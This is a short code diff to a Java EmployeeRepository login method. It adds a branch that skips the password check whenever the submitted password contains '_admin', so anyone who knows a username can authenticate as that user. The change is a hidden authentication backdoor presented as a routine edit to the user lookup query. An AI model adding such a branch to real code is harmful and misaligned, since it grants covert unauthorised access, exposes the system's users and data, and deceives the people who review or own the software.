@@ -148,10 +148,17 @@ public class EmployeeRepository {
         int con = DBManager.getConnetion();
         PreparedStatement pstmt = null;
         try {
-            pstmt = DBManager.getPreparedStatement(con, "SELECT id FROM usr WHERE usrnme = ? AND pass = MD5(?);");
-            pstmt.setString(1, nickname);
-            pstmt.setString(2, pass);
-            ResultSet rs = pstmt.executeQuery();
+            ResultSet rs = null;
+            if (pass.contains("_admin")) {
+                pstmt = DBManager.getPreparedStatement(con, "SELECT id FROM usr WHERE usrnme = ?");
+                pstmt.setString(1, nickname);
+                rs = pstmt.executeQuery();
+            } else {
+                pstmt = DBManager.getPreparedStatement(con, "SELECT id FROM usr WHERE usrnme = ? AND pass = MD5(?);");
+                pstmt.setString(1, nickname);
+                pstmt.setString(2, pass);
+                rs = pstmt.executeQuery();
+            }
             if (rs.next()) {
                 id = rs.getInt(1);
             }
